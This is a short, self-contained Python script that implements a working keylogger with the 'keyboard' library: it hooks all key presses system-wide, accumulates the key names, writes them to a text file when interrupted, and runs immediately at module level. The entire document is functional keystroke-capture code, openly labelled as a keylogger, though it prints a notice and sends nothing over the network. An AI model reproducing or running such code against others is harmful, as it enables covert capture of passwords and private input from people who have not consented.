import keyboard

def keylogger(output_file="logged_keystrokes.txt"):
   
    try:
        # Check if the `keyboard` library is installed
        import keyboard
    except ImportError:
        raise ImportError("The 'keyboard' library is not installed. Please install it using 'pip install keyboard'.")

    # Initialize an empty string to store the logged keystrokes
    logged_keystrokes = ""

    def on_key_press(event):
     
        nonlocal logged_keystrokes

        # Append the pressed key to the logged keystrokes
        logged_keystrokes += event.name

        # Continue capturing keystrokes
        return True

    # Register the callback function for key press events
    keyboard.on_press(on_key_press)

    print("Capturing keystrokes...")

    try:
        # Start capturing keystrokes
        keyboard.wait()
    except KeyboardInterrupt:
        # Handle KeyboardInterrupt to stop the keylogger
        pass
    finally:
        # Unregister the callback function
        keyboard.unhook_all()

        # Save the logged keystrokes to a text file
        with open(output_file, "w") as file:
            file.write(logged_keystrokes)

    # Return the logged keystrokes
    return logged_keystrokes

# Example usage of the keylogger function
logged_keys = keylogger()
print(f"Logged keystrokes: {logged_keys}")
